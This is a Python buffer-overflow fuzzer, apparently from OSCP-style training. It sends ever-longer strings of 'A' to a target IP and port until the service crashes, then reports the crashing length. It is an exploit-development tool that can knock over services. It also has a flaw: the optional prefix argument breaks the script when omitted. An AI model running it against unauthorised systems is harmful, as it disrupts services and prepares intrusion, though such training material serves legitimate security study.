#!/usr/bin/python3
#Python 3 BOF Fuzzer for terminal
#Credits:
#Olivier Laflamme - https://boschko.ca/braindead-buffer-overflow-guide-to-pass-the-oscp-blindfolded/
#Heath Adams (The Cyber Mentor)'s PNPT Training - https://github.com/hmaverickadams

#Expected: The vulnerable program sends some data on connection. Otherwise, remove line #41: "s.recv(1024)"

import argparse, sys, socket
from time import sleep

args = argparse.ArgumentParser(usage='%(prog)s -i <IP> -p <PORT> --prefix <Optional> -b <Optional>')
args.add_argument("-i", "--ip", required=True, help="IP Address")
args.add_argument("-p", "--port", type=int, required=True, help="Port")
args.add_argument("--prefix", help="String prefixed to the payload")
args.add_argument("-b", "--bytes", type=int, help="Exact bytes to crash the target. Use to consistently replicate the crash.") 
args = vars(args.parse_args())

ip = args["ip"]
port= args["port"]
try:
	socket.inet_aton(ip)
	host = (ip,port)
except:
	sys.exit("Invalid IP Address.")

prefix = args["prefix"]

if (args["bytes"]):
	payload = prefix + "A" * args["bytes"]
else:
	payload = prefix + "A" * 100

iterated = False

while True:
	try:
		with socket.socket(socket.AF_INET, socket. SOCK_STREAM) as s:
			s.settimeout(2)
			s.connect(host)
			s.recv(1024) 
			print("[*] Sending payload with size: " + str(len(payload)))
			s.send(payload.encode())
			s.close()
		sleep(2)
		payload = payload + "A" * 100
		iterated = True
	except Exception:
		if iterated:
			print("Crash occured at buffer length: " + str(len(payload) - 100))
			sys.exit()
		else:
			sys.exit("Couldn't connect to the target.")
